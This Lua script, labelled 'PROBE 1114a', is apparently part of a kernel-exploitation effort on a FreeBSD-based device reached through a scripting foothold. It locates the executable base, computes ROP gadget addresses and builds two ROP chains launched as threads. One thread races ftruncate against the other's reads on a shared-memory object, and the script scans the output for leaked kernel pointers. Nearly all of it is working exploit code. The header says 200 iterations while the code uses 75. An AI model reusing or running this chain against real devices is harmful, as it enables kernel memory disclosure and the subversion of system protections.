-- CRASH_CLASS: HIGH
-- PROBE 1114a: read(3) + ftruncate race on SHM
--
-- Child A: rapid ftruncate SMALL/LARGE (200 iters)
-- Child B: rapid read(shm_fd, buf, PAGE) at offset PAGE_1 (200 iters)
-- Parent: checks done flags, scans read buffer for kernel pointers
--
-- read(3) on an shm fd goes through VOP_READ which accesses vm_object
-- pages in kernel context. If ftruncate removes pages concurrently,
-- read might return stale/freed page data.

print("=== PROBE 1114a: READ+FTRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h, l = val.h, val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local pdr_lo, pdr_hi = eoff(0xC9DFE)  -- pop rdi; ret
local psr_lo, psr_hi = eoff(0xD77D)   -- pop rsi; ret
local par_lo, par_hi = eoff(0x992)     -- pop rax; ret
local prdx_lo, prdx_hi = eoff(0x3B02D7)  -- pop rdx; ret
local bret_lo, bret_hi = eoff(0x42)    -- bare ret
local mwr_lo, mwr_hi = eoff(0x92C67)   -- mov [rdi], rax; ret
local stub_lo, stub_hi = split(stub)

local LARGE = 0x40000
local SMALL = 0x4000
local ITERS = 75

-- [A] SHM setup
print("[A] SHM")
local shm_fd = N(mk(482)(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
N(mk(480)(uint64(shm_fd), uint64(LARGE)))

-- Write sentinels via mmap
local map = mk(477)(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local mn = N(map)
for p = 0, 15 do
    wd(mn + p * 0x4000, 0xAA000000 + p)
    wd(mn + p * 0x4000 + 4, 0xBB000000 + p)
end
print("sentinels ok")

-- Shared read buffer for child B
local rbuf = memory.alloc(0x4000)
local rbuf_lo, rbuf_hi = split(N(rbuf))

-- Done flags
local doneA = memory.alloc(8); wd(N(doneA), 0)
local doneB = memory.alloc(8); wd(N(doneB), 0)
local doneA_lo, doneA_hi = split(N(doneA))
local doneB_lo, doneB_hi = split(N(doneB))

-- Counter for child B read results
local rcnt = memory.alloc(8); wd(N(rcnt), 0)
local rcnt_lo, rcnt_hi = split(N(rcnt))

-- TCB (minimal)
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
local tcb_lo, tcb_hi = split(tcb)
for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
local fs_ptr = memory.alloc(8)
wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
local fsptr_lo, fsptr_hi = split(N(fs_ptr))

-- [B] Child A: ftruncate loop
print("[B] child A chain (ftruncate)")
local stkA = memory.alloc(0x200000)
local sbA = N(stkA)
local ssA = 0x100000
local rspA = sbA + ssA - ((sbA + ssA) % 16) - 8

local pos = 0
local function putA(lo, hi)
    wd(rspA + pos * 8, lo)
    wd(rspA + pos * 8 + 4, hi or 0)
    pos = pos + 1
end

-- sysarch
putA(pdr_lo, pdr_hi); putA(129, 0)
putA(psr_lo, psr_hi); putA(fsptr_lo, fsptr_hi)
putA(par_lo, par_hi); putA(165, 0)
putA(stub_lo, stub_hi)

for i = 1, ITERS do
    putA(pdr_lo, pdr_hi); putA(shm_fd, 0)
    putA(psr_lo, psr_hi); putA(SMALL, 0)
    putA(par_lo, par_hi); putA(480, 0)
    putA(stub_lo, stub_hi)
    putA(pdr_lo, pdr_hi); putA(shm_fd, 0)
    putA(psr_lo, psr_hi); putA(LARGE, 0)
    putA(par_lo, par_hi); putA(480, 0)
    putA(stub_lo, stub_hi)
end

putA(par_lo, par_hi); putA(0xDEAD0A, 0)
putA(pdr_lo, pdr_hi); putA(doneA_lo, doneA_hi)
putA(mwr_lo, mwr_hi)
putA(pdr_lo, pdr_hi); putA(0, 0)
putA(par_lo, par_hi); putA(431, 0)
putA(stub_lo, stub_hi)
print(string.format("  A: %d entries", pos))

-- [C] Child B: read loop (read shm_fd at offset 0x4000 into rbuf)
-- Each iteration: lseek(478, shm_fd, 0x4000, SEEK_SET=0) then read(3, shm_fd, rbuf, 0x4000)
print("[C] child B chain (read)")
local stkB = memory.alloc(0x200000)
local sbB = N(stkB)
local ssB = 0x100000
local rspB = sbB + ssB - ((sbB + ssB) % 16) - 8

local tcbB = memory.alloc(0x1000)
local tcbB_a = N(tcbB)
local tcbB_lo, tcbB_hi = split(tcbB)
for i = 0, 56, 8 do wd(tcbB_a + i, tcbB_lo); wd(tcbB_a + i + 4, tcbB_hi) end
local fspB = memory.alloc(8)
wd(N(fspB), tcbB_lo); wd(N(fspB) + 4, tcbB_hi)
local fspB_lo, fspB_hi = split(N(fspB))

local posB = 0
local function putB(lo, hi)
    wd(rspB + posB * 8, lo)
    wd(rspB + posB * 8 + 4, hi or 0)
    posB = posB + 1
end

-- sysarch for child B
putB(pdr_lo, pdr_hi); putB(129, 0)
putB(psr_lo, psr_hi); putB(fspB_lo, fspB_hi)
putB(par_lo, par_hi); putB(165, 0)
putB(stub_lo, stub_hi)

for i = 1, ITERS do
    -- lseek(478): lseek(fd, offset, whence)
    -- FreeBSD lseek is syscall 478 with args (fd, offset, whence)
    putB(pdr_lo, pdr_hi); putB(shm_fd, 0)
    putB(psr_lo, psr_hi); putB(0x4000, 0)  -- offset = page 1
    putB(prdx_lo, prdx_hi); putB(0, 0)     -- SEEK_SET
    putB(par_lo, par_hi); putB(478, 0)
    putB(stub_lo, stub_hi)

    -- read(3): read(fd, buf, count)
    putB(pdr_lo, pdr_hi); putB(shm_fd, 0)
    putB(psr_lo, psr_hi); putB(rbuf_lo, rbuf_hi)
    putB(prdx_lo, prdx_hi); putB(0x4000, 0) -- 1 page
    putB(par_lo, par_hi); putB(3, 0)
    putB(stub_lo, stub_hi)
end

putB(par_lo, par_hi); putB(0xDEAD0B, 0)
putB(pdr_lo, pdr_hi); putB(doneB_lo, doneB_hi)
putB(mwr_lo, mwr_hi)
putB(pdr_lo, pdr_hi); putB(0, 0)
putB(par_lo, par_hi); putB(431, 0)
putB(stub_lo, stub_hi)
print(string.format("  B: %d entries", posB))

-- [D] Spawn both children
print("[D] spawning")

local parA = memory.alloc(0x40)
local paA = N(parA)
for i = 0, 0x3C, 4 do wd(paA + i, 0) end
wq(paA, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
wq(paA + 8, uint64(0))
wq(paA + 0x10, uint64(sbA))
wq(paA + 0x18, uint64(ssA))
local tidA = memory.alloc(8); wq(N(tidA), uint64(0))
wq(paA + 0x30, tidA)

local parB = memory.alloc(0x40)
local paB = N(parB)
for i = 0, 0x3C, 4 do wd(paB + i, 0) end
wq(paB, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
wq(paB + 8, uint64(0))
wq(paB + 0x10, uint64(sbB))
wq(paB + 0x18, uint64(ssB))
local tidB = memory.alloc(8); wq(N(tidB), uint64(0))
wq(paB + 0x30, tidB)

local ok1, rv1 = pcall(function() return mk(455)(parA, uint64(0x38)) end)
print("thr_new A=" .. (ok1 and N(rv1) or -999))

local ok2, rv2 = pcall(function() return mk(455)(parB, uint64(0x38)) end)
print("thr_new B=" .. (ok2 and N(rv2) or -999))

-- [E] Parent: wait and scan
print("[E] scanning")
local kptr_count = 0
local anom_count = 0
local total_scans = 0
local da, db = 0, 0

for round = 1, 2000 do
    -- Scan the read buffer for kernel pointers
    for off = 0, 0x3FFC, 8 do
        local lo = rd(N(rbuf) + off) or 0
        local hi = rd(N(rbuf) + off + 4) or 0
        if lo < 0 then lo = lo + 0x100000000 end
        if hi < 0 then hi = hi + 0x100000000 end
        if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
            kptr_count = kptr_count + 1
            if kptr_count <= 20 then
                print(string.format("  [KPTR!] r%d +%d: 0x%08X%08X", round, off, hi, lo))
            end
        end
    end
    total_scans = total_scans + 1

    da = rd(N(doneA)) or 0
    db = rd(N(doneB)) or 0
    if da ~= 0 and db ~= 0 then break end
end

print("")
print(string.format("scans=%d doneA=%d doneB=%d", total_scans, da, db))
print(string.format("kptrs=%d", kptr_count))

-- Final buffer dump (first 64 bytes)
print("rbuf sample:")
for i = 0, 56, 8 do
    local lo = rd(N(rbuf) + i) or 0
    local hi = rd(N(rbuf) + i + 4) or 0
    if lo < 0 then lo = lo + 0x100000000 end
    if hi < 0 then hi = hi + 0x100000000 end
    print(string.format("  +%02X: 0x%08X%08X", i, hi, lo))
end

print("alive=" .. tostring(alive()))
print("=== PROBE 1114a COMPLETE ===")
